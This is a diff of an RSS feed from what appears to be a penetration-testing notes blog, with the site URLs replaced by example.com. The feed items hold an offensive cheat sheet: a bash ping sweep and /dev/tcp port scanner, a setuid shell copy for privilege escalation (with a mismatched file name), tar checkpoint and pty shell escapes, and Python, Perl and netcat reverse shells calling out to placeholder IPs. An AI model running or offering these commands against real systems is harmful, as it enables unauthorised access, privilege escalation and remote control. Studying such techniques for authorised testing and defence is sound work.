@@ -1,60 +1,59 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Bash on pentest notes</title>
-    <link>https://sosprz.github.io/tags/bash/</link>
-    <description>Recent content in Bash on pentest notes</description>
+    <title>Bash on Pentest notes</title>
+    <link>https://example.com/tags/bash/</link>
+    <description>Recent content in Bash on Pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>Your language code</language>
     <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
     
-	<atom:link href="https://sosprz.github.io/tags/bash/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://example.com/tags/bash/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Bash scripts</title>
-      <link>https://sosprz.github.io/post/bash-scrips/</link>
+      <link>https://example.com/posts/bash-scrips/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/post/bash-scrips/</guid>
+      <guid>https://example.com/posts/bash-scrips/</guid>
       <description>Ping #!/bin/bash echo &amp;ldquo;first three octets of network to scan, end with a .&amp;rdquo; read network for host in {1..254}; do ping -c1 $network$host &amp;amp;&amp;gt;/dev/null; [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$network$host is up&amp;rdquo; echo &amp;ldquo;done checking host: &amp;ldquo; $network$host done 
 Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for port in {1..65000}; do (echo &amp;gt; /dev/tcp/$host/$port) &amp;amp;&amp;gt;/dev/null [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$port open&amp;rdquo; done</description>
     </item>
     
     <item>
       <title>Privilege escalation</title>
-      <link>https://sosprz.github.io/post/privesc/</link>
+      <link>https://example.com/posts/privesc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/post/privesc/</guid>
+      <guid>https://example.com/posts/privesc/</guid>
       <description>#!/bin/sh cp /bin/dash /tmp/privest chmod 4755 /tmp/privesc</description>
     </item>
     
     <item>
       <title>Shell</title>
-      <link>https://sosprz.github.io/post/shell/</link>
+      <link>https://example.com/posts/shell/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/post/shell/</guid>
+      <guid>https://example.com/posts/shell/</guid>
       <description> export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python -c import pty; pty.spawn(&#34;/bin/bash&#34;) python3 -c import pty; pty.spawn(&#39;/bin/bash&#39;) echo os.system(&#39;/bin/bash&#39;) /bin/sh -i echo &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;  /tmp/asdf.py python /tmp/asdf.py  </description>
     </item>
     
     <item>
       <title>Shell escape</title>
-      <link>https://sosprz.github.io/post/shell-esc/</link>
+      <link>https://example.com/posts/shell-esc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/post/shell-esc/</guid>
+      <guid>https://example.com/posts/shell-esc/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
 tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash</description>
     </item>
     
     <item>
       <title>Shell reverse</title>
-      <link>https://sosprz.github.io/post/shell-reverse/</link>
+      <link>https://example.com/posts/shell-reverse/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/post/shell-reverse/</guid>
+      <guid>https://example.com/posts/shell-reverse/</guid>
       <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
